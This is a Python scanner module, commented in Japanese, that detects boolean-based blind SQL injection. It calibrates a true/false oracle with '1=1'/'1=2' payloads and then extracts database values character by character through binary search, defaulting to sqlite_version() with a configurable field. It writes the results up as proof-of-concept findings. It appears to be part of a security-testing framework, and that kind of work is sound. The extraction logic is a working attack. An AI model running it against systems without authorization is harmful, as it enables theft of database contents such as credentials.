"""
Smart Blind SQLi Hunter - ブール(boolean)ベース・ブラインド SQL インジェクション (SGK-2026-0502)

応答本文にデータもエラーも出ない（in-band 反射なし）のに、注入した論理条件の真偽で
応答が変わる注入点を、**自己校正した真偽オラクル**で確定し、さらに**実データを1文字ずつ
抽出**して実害を証明する。

確定は「決定論的な真偽オラクル＋実データ抽出」で行う:
  - `<base> AND 1=1`（恒真）→ TRUE クラスの応答
  - `<base> AND 1=2`（恒偽）→ FALSE クラスの応答
  両者が判別可能（TRUE 応答にだけ現れる特徴 vs FALSE 応答にだけ現れる特徴）なら、注入が
  クエリの真偽に影響している＝ブラインド SQLi。その真偽オラクルで
  `unicode(substr((SELECT <field>),i,1))>N` を二分探索し、DB の値（既定は非機微な
  `sqlite_version()`）を1文字ずつ復元する＝本文にデータが出なくても任意 DB 内容を抜ける実害。

真偽の「特徴（signature）」は実行時に自動導出する（TRUE 応答にあり FALSE 応答に無い最長行／
逆も）。製品固有文字列をエンジンにハードコードしない。非破壊（読み取りクエリのみ）。
"""
import difflib
import logging
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

_SNIPPET_CAP = 1200
_SIG_MIN_LEN = 8
# 真偽オラクルが判別可能とみなす上限（TRUE 応答と FALSE 応答がこれ以上似ていたら
# 判別不能＝オラクル不成立でフェイルクローズ）。
_ORACLE_MAX_RATIO = 0.985
_MAX_VALUE_LEN = 48
_MAX_LEN_PROBE = 64
_ASCII_LO, _ASCII_HI = 32, 126
# PoC に載せる抽出の実リクエスト/応答対の対象文字数（先頭から。判定に「抽出が実際に
# 起きている」raw 証拠を見せるため・[[poc-judge-raw-evidence]]）。
_TRANSCRIPT_CHARS = 2
# transcript 応答スニペットの判別行中心の切り出し幅。
_TX_SNIPPET = 220


def _lines(text: str) -> List[str]:
    return [ln.strip() for ln in (text or "").splitlines() if ln.strip()]


def build_blind_sqli_value(base_value: str, quote: str, condition: str) -> str:
    """base 値に論理条件を連結した注入値を作る（封印再現チェッカーと共有）。

    - 数値文脈(quote=="")   : ``1 AND <cond>``
    - 文字列文脈(quote=="'"): ``1' AND <cond> AND '1'='1``（引用符を閉じて再バランス）
    """
    if quote:
        return f"{base_value}{quote} AND {condition} AND {quote}1{quote}={quote}1"
    return f"{base_value} AND {condition}"


def build_blind_sqli_url(mode: str, base_url: str, param: str, value: str) -> str:
    """注入値を URL に載せる（path 末尾／query パラメータ・封印再現チェッカーと共有）。"""
    if str(mode).lower() == "query":
        parsed = urllib.parse.urlparse(base_url)
        q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        q[param or "id"] = value
        new_q = urllib.parse.urlencode(q)
        return urllib.parse.urlunparse(parsed._replace(query=new_q))
    return base_url.rstrip("/") + "/" + urllib.parse.quote(value, safe="")


_TAG_SOUP_RE = re.compile(r"^<(svg|path|g|link|script|meta|style|use|defs|rect|circle)\b",
                          re.IGNORECASE)
_WORD_RE = re.compile(r"[A-Za-z]{2,}")


def _sig_score(line: str) -> int:
    """判別シグネチャとしての「意味の強さ」を採点する。

    人間可読でページ状態を明確に表す行（``<title>``・自然文）を高く、SVG パス/属性の
    羅列（真偽差分の識別子として弱い＝poc_judge が『切り詰め差と区別できない』と却下する）を
    低く採点する。真偽オラクルの識別に加え、抽出 transcript のスニペットが「意味のある差分」を
    中心に写るようにするため（[[poc-judge-raw-evidence]]）。
    """
    words = _WORD_RE.findall(line)
    score = len(words)
    if "<title" in line.lower():
        score += 100
    if _TAG_SOUP_RE.match(line.strip()):
        score -= 50
    return score


def _derive_signature(present: str, absent: str) -> Optional[str]:
    """``present`` にあり ``absent`` に（部分文字列としても）無い、意味のある特徴行を返す。

    行単位で候補を集め、absent 本文に部分一致で現れるものは除外して曖昧さを排除。``_sig_score``
    で人間可読な行（title/自然文）を優先し（同点は長い方）、最も意味の強い候補を採用する。
    """
    absent_lines = set(_lines(absent))
    candidates: List[str] = []
    for ln in _lines(present):
        if ln in absent_lines:
            continue
        if len(ln) < _SIG_MIN_LEN or not any(c.isalpha() for c in ln):
            continue
        if ln in absent:  # 部分一致でも absent に出るなら判別に使えない
            continue
        candidates.append(ln)
    if not candidates:
        return None
    return max(candidates, key=lambda ln: (_sig_score(ln), len(ln)))


class SmartBlindSQLiHunter(Specialist):
    name = "SmartBlindSQLiHunter"
    description = "Boolean-based blind SQL injection detector (self-calibrating oracle + data extraction)"
    timeout_seconds = 180
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}
        # 実行時に確定した真偽シグネチャ（classify で共有）。
        self._true_sig: Optional[str] = None
        self._false_sig: Optional[str] = None

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = await self._probe(task)
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _auth_headers(self, task: Task) -> Dict[str, str]:
        params = self._params(task)
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        headers = dict(_auth.get("auth_headers", {}) or {})
        cookies = str(_auth.get("cookies", "") or params.get("cookies", "") or "")
        if cookies and "Cookie" not in headers:
            headers["Cookie"] = cookies
        return headers

    # --- injection value / URL construction ---------------------------------
    def _inject_value(self, base_value: str, quote: str, condition: str) -> str:
        return build_blind_sqli_value(base_value, quote, condition)

    def _effective_target(self, task: Task) -> Tuple[str, str, str, str]:
        """対象 URL から (mode, base_url, param, base_value) を汎用に導出する（SGK-2026-0506）。

        - ``blind_sqli_mode`` が明示されていれば従来通り（param/base_value も params 既定）。
        - 明示が無く対象 URL にクエリがあれば ``query`` モード＝先頭クエリ param とその現在値を
          URL から導出（自走で任意のクエリ対象に自己適応）。
        - クエリが無ければ従来の ``path``/``id``/``1``（挙動不変）。

        ラボ固有のヒント（特定 param 名・成功印・DB 種別）は一切与えない。すべて対象 URL と
        params のみから導出する（非カーブフィット）。
        """
        params = self._params(task)
        base_url = str(params.get("blind_sqli_base_url") or task.target)
        explicit_mode = params.get("blind_sqli_mode")
        if explicit_mode:
            mode = str(explicit_mode).lower()
            param = str(params.get("blind_sqli_param") or "id")
            base_value = str(params.get("blind_sqli_base_value") or "1")
            return mode, base_url, param, base_value
        query_pairs = urllib.parse.parse_qsl(
            urllib.parse.urlparse(base_url).query, keep_blank_values=True
        )
        if query_pairs:
            param = str(params.get("blind_sqli_param") or query_pairs[0][0])
            current = dict(query_pairs).get(param, "")
            base_value = str(params.get("blind_sqli_base_value") or current or "1")
            return "query", base_url, param, base_value
        param = str(params.get("blind_sqli_param") or "id")
        base_value = str(params.get("blind_sqli_base_value") or "1")
        return "path", base_url, param, base_value

    def _build_url(self, task: Task, value: str) -> str:
        mode, base_url, param, _base_value = self._effective_target(task)
        return build_blind_sqli_url(mode, base_url, param, value)

    async def _get(self, url: str, headers: Dict[str, str]) -> Tuple[int, str]:
        async def _do(client):
            return await client.request("GET", url, headers=dict(headers or {}), use_proxy=True)

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        status = int(getattr(resp, "status", 0) or 0)
        rbody = getattr(resp, "body", None)
        if rbody is None:
            rbody = getattr(resp, "text", "") or ""
        if isinstance(rbody, bytes):
            rbody = rbody.decode("utf-8", errors="replace")
        return status, str(rbody)

    async def _ask(self, task: Task, base_value: str, quote: str, condition: str,
                   headers: Dict[str, str]) -> Optional[bool]:
        """論理条件を注入して応答を真偽オラクルで分類する。TRUE/FALSE/None(曖昧)。"""
        cls, _body, _url = await self._ask_full(task, base_value, quote, condition, headers)
        return cls

    async def _ask_full(self, task: Task, base_value: str, quote: str, condition: str,
                        headers: Dict[str, str]) -> Tuple[Optional[bool], str, str]:
        """``_ask`` に加え、応答本文と URL も返す（PoC 用 transcript の記録に使う）。"""
        url = self._build_url(task, self._inject_value(base_value, quote, condition))
        try:
            _status, body = await self._get(url, headers)
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] oracle send failed: %s", self.name, exc)
            return None, "", url
        return self._classify(body), body, url

    def _tx_snippet(self, body: str, cls: Optional[bool]) -> str:
        """transcript 用に、判別に使ったシグネチャ行を中心に応答を短く切り出す。"""
        sig = self._true_sig if cls else self._false_sig
        idx = body.find(sig) if sig else -1
        if idx < 0:
            return body[:_TX_SNIPPET]
        half = _TX_SNIPPET // 2
        return body[max(0, idx - half): idx + len(sig) + half]

    def _classify(self, body: str) -> Optional[bool]:
        ts, fs = self._true_sig, self._false_sig
        if not ts or not fs:
            return None
        is_t = ts in body
        is_f = fs in body
        if is_t and not is_f:
            return True
        if is_f and not is_t:
            return False
        return None

    async def _extract(self, task: Task, base_value: str, quote: str, field_expr: str,
                       headers: Dict[str, str], max_len: int
                       ) -> Tuple[str, List[Dict[str, Any]]]:
        """真偽オラクルの二分探索で ``field_expr`` の値を1文字ずつ復元する。

        先頭 ``_TRANSCRIPT_CHARS`` 文字については、確定した文字コード c に対し
        ``=c``（TRUE）／``=c+1``（FALSE）の等値確認を実リクエストで行い、その応答スニペットを
        transcript に記録する（＝抽出が実際に真偽差分で起きている raw 証拠）。
        """
        transcript: List[Dict[str, Any]] = []
        # 長さを二分探索（上限クランプ）。
        lo, hi = 0, _MAX_LEN_PROBE
        while lo < hi:
            mid = (lo + hi + 1) // 2
            r = await self._ask(task, base_value, quote, f"length({field_expr})>={mid}", headers)
            if r is None:
                return "", transcript
            if r:
                lo = mid
            else:
                hi = mid - 1
        length = min(lo, max_len)
        out: List[str] = []
        for i in range(1, length + 1):
            clo, chi = _ASCII_LO, _ASCII_HI
            ok = True
            while clo < chi:
                mid = (clo + chi) // 2
                r = await self._ask(
                    task, base_value, quote,
                    f"unicode(substr({field_expr},{i},1))>{mid}", headers)
                if r is None:
                    ok = False
                    break
                if r:
                    clo = mid + 1
                else:
                    chi = mid
            if not ok:
                break
            out.append(chr(clo))
            if i <= _TRANSCRIPT_CHARS:
                await self._record_char_proof(
                    task, base_value, quote, field_expr, headers, i, clo, transcript)
        return "".join(out), transcript

    async def _record_char_proof(self, task: Task, base_value: str, quote: str,
                                 field_expr: str, headers: Dict[str, str], pos: int,
                                 code: int, transcript: List[Dict[str, Any]]) -> None:
        """位置 pos の文字コード code を等値確認（=code→TRUE / =code+1→FALSE）し記録。"""
        for probe_code, expect in ((code, True), (code + 1, False)):
            cond = f"unicode(substr({field_expr},{pos},1))={probe_code}"
            cls, body, url = await self._ask_full(task, base_value, quote, cond, headers)
            if cls is not expect:
                continue  # 期待と違えば記録しない（transcript は確実な対のみ）
            transcript.append({
                "pos": pos,
                "char": chr(code),
                "condition": cond,
                "url": url,
                "classified": "TRUE" if cls else "FALSE",
                "snippet": self._tx_snippet(body, cls),
            })

    async def _probe(self, task: Task) -> Optional[Dict[str, Any]]:
        params = self._params(task)
        headers = self._auth_headers(task)
        mode, base_url, param, base_value = self._effective_target(task)
        quote = str(params.get("blind_sqli_quote") or "")
        field_expr = str(params.get("blind_sqli_extract_field") or "sqlite_version()")
        # SELECT でラップ（式でもサブクエリでも安全）。
        field_select = f"(SELECT {field_expr})"

        true_cond, false_cond = "1=1", "1=2"
        try:
            _s_true, body_true = await self._get(
                self._build_url(task, self._inject_value(base_value, quote, true_cond)), headers)
            _s_false, body_false = await self._get(
                self._build_url(task, self._inject_value(base_value, quote, false_cond)), headers)
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] oracle calibration failed: %s", self.name, exc)
            return None

        # 真偽が判別不能（応答がほぼ同一）ならオラクル不成立 → フェイルクローズ。
        if difflib.SequenceMatcher(None, body_true, body_false).ratio() > _ORACLE_MAX_RATIO:
            return None
        self._true_sig = _derive_signature(body_true, body_false)
        self._false_sig = _derive_signature(body_false, body_true)
        if not self._true_sig or not self._false_sig:
            return None
        # 恒真=TRUE・恒偽=FALSE に分類できることを確認（＝注入が真偽に効いている）。
        if self._classify(body_true) is not True or self._classify(body_false) is not False:
            return None

        # 実データ抽出（既定 sqlite_version()＝非機微）。抽出できて初めて実害確定。
        extracted, transcript = await self._extract(
            task, base_value, quote, field_select, headers, _MAX_VALUE_LEN)
        if not extracted:
            return None

        true_url = self._build_url(task, self._inject_value(base_value, quote, true_cond))
        false_url = self._build_url(task, self._inject_value(base_value, quote, false_cond))
        half = _SNIPPET_CAP // 2
        # 判別特徴を中心に、真偽応答を同一領域で切り出す（差分は同じ領域の両側で見せる）。
        ti = body_true.find(self._true_sig)
        fi = body_false.find(self._false_sig)
        true_snip = body_true[max(0, ti - half): ti + len(self._true_sig) + half]
        false_snip = body_false[max(0, fi - half): fi + len(self._false_sig) + half]
        return {
            "request_url": base_url,
            "mode": mode,
            "param": param,
            "base_value": base_value,
            "quote": quote,
            "true_condition": true_cond,
            "false_condition": false_cond,
            "true_url": true_url,
            "false_url": false_url,
            "true_sig": self._true_sig,
            "false_sig": self._false_sig,
            "true_served_body": true_snip,
            "false_served_body": false_snip,
            "extracted_field": field_expr,
            "extracted_value": extracted,
            "extraction_transcript": transcript,
            "auth_headers": headers,
        }

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        url = proof["request_url"]
        base_value = proof["base_value"]
        quote = proof["quote"]
        true_cond = proof["true_condition"]
        false_cond = proof["false_condition"]
        true_url = proof["true_url"]
        false_url = proof["false_url"]
        true_sig = proof["true_sig"]
        false_sig = proof["false_sig"]
        true_body = proof["true_served_body"]
        false_body = proof["false_served_body"]
        field = proof["extracted_field"]
        value = proof["extracted_value"]
        transcript = proof.get("extraction_transcript") or []

        true_val = self._inject_value(base_value, quote, true_cond)
        false_val = self._inject_value(base_value, quote, false_cond)
        extract_cond = f"unicode(substr((SELECT {field}),i,1))>N"
        extract_val = self._inject_value(base_value, quote, extract_cond)

        poc_request = (
            "# Boolean oracle calibration (only the boolean condition differs)\r\n"
            "# Step 1 — TRUE condition (tautology). Injected value:\r\n"
            f"GET {true_url} HTTP/1.1\r\n"
            f"#   injected value = {true_val!r}\r\n"
            "\r\n"
            "# Step 2 — FALSE condition (contradiction). Injected value:\r\n"
            f"GET {false_url} HTTP/1.1\r\n"
            f"#   injected value = {false_val!r}\r\n"
            "\r\n"
            "# Step 3 — data extraction: for each position i, binary-search the character\r\n"
            "#   using the SAME true/false oracle (no data ever appears in the body):\r\n"
            f"#   injected value = {extract_val!r}\r\n"
        )
        # 実抽出の raw 証拠（先頭数文字の等値確認 request/response 対）。
        tx_lines = []
        for e in transcript:
            tx_lines.append(
                f"# position {e['pos']} == {e['char']!r}: condition {e['condition']}  =>  {e['classified']}\r\n"
                f"GET {e['url']} HTTP/1.1\r\n"
                f"...{e['snippet']}...\r\n"
            )
        tx_block = "\r\n".join(tx_lines) if tx_lines else "(transcript unavailable)\r\n"
        poc_response = (
            "# Step 1 response — TRUE class (distinctive line present ONLY when the query is true)\r\n"
            f"...{true_body}...\r\n"
            "\r\n"
            "# Step 2 response — FALSE class (a DIFFERENT distinctive line; the true-line is absent)\r\n"
            f"...{false_body}...\r\n"
            "\r\n"
            f"ORACLE: a true condition yields a response containing {true_sig!r} (and NOT "
            f"{false_sig!r}); a false condition yields the opposite. The request/response bodies "
            "carry no injected data at all — only this true/false difference.\r\n"
            "\r\n"
            "# Step 3 — ACTUAL extraction transcript (equality confirmation per character; each "
            "line below is a real request whose response was classified by the SAME oracle):\r\n"
            f"{tx_block}\r\n"
            f"EXTRACTED via the oracle alone (binary search + equality confirm per character): "
            f"{field} = {value!r}\r\n"
            "CORRELATION: the two requests are identical except '1=1' vs '1=2'. The response flips "
            "between the two classes; the transcript above shows real requests where "
            "`unicode(substr(...))=<code>` is TRUE and `=<code+1>` is FALSE, pinning each character. "
            "Iterating this reconstructs live database content with zero data in the response body "
            "=> boolean-based blind SQL injection confirmed."
        )
        impact = (
            f"注入点 {url} は、送った論理条件の真偽で応答が変わる（恒真 `{true_val}`→TRUE クラス／"
            f"恒偽 `{false_val}`→FALSE クラス・応答本文にデータは一切出ない＝ブラインド）。この真偽"
            f"オラクルを二分探索で回し、データベースの値 `{field}` を本文に一切出さずに1文字ずつ復元した"
            f"（実測抽出値: `{value}`）。同じオラクルで任意の DB 内容（ユーザー名・パスワードハッシュ等）を"
            "抽出できる＝ブラインド SQL インジェクションによるデータ窃取の実害。非破壊（読み取りのみ・"
            "既定の抽出対象は非機微な DB バージョン）。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.BLIND_SQLI,
            severity=Severity.CRITICAL,
            title="Boolean-based blind SQL injection (data extraction via true/false oracle)",
            description=(
                "Boolean-based blind SQLi confirmed: identical requests differing only in a boolean "
                f"condition ('1=1' vs '1=2') flip the response between two classes, and the oracle "
                f"extracted live DB content ({field} = {value!r}) with no data in the response body."
            ),
            source_agent=self.name,
            confidence=0.96,
            impact=impact,
            reproduction_steps=[
                f"恒真条件 `{true_val}` を注入し TRUE クラスの応答（特徴 {true_sig!r} 出現）を確認する。",
                f"恒偽条件 `{false_val}` を注入し FALSE クラスの応答（特徴 {false_sig!r} 出現）を確認する。",
                f"真偽オラクルを二分探索で回し `{field}` を1文字ずつ復元する（実測: `{value}`）。",
            ],
            tags=["sqli", "blind", "boolean_based", "critical", "blind_sqli_confirmed"],
            evidence=Evidence(
                request_method="GET",
                request_url=true_url,
                request_headers={**proof.get("auth_headers", {})},
                request_body="",
                response_status=200,
                response_headers={},
                response_body=true_body,
            ),
            additional_info={
                "blind_sqli_evidence": {
                    "request_url": url,
                    "true_condition": true_cond,
                    "false_condition": false_cond,
                    "oracle_true_class": "true",
                    "oracle_false_class": "false",
                    "true_sig": true_sig,
                    "false_sig": false_sig,
                    "true_served_body": true_body,
                    "false_served_body": false_body,
                    "extracted_field": field,
                    "extracted_value": value,
                },
                "blind_sqli_replay": {
                    "mode": proof["mode"],
                    "base_url": url,
                    "base_value": base_value,
                    "quote": quote,
                    "param": proof.get("param", "id"),
                    "extracted_field": field,
                },
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )
